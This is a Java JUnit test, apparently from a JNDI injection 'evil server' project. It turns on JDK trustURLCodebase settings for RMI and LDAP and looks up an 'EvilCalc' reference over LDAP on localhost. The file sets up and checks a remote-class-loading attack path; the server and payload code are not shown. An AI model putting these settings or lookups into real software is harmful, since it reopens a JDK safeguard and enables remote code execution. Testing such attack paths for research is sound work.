package cc11001100.evil.server;

import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import spark.utils.Assert;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.NotBoundException;
import java.rmi.RemoteException;

/**
 * @author CC11001100
 */
class EvilServerTest {

    private EvilServer evilServer;

    @BeforeEach
    void setUp() throws AlreadyBoundException, NamingException, RemoteException {
//        evilServer = new EvilServer();
//        evilServer.runServer();
    }

    @AfterEach
    void tearDown() throws NotBoundException, RemoteException {
//        evilServer.shutdown();
    }

    @Test
    void testLdap() throws NamingException {

        // 高版本JDK手动打开限制
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");

        Context namingContext = new InitialContext();
        Object lookup = namingContext.lookup("ldap://localhost:10010/EvilCalc");
        Reference r = (Reference) lookup;
        System.out.println(r.getAll());
        Assert.notNull(lookup);
    }
}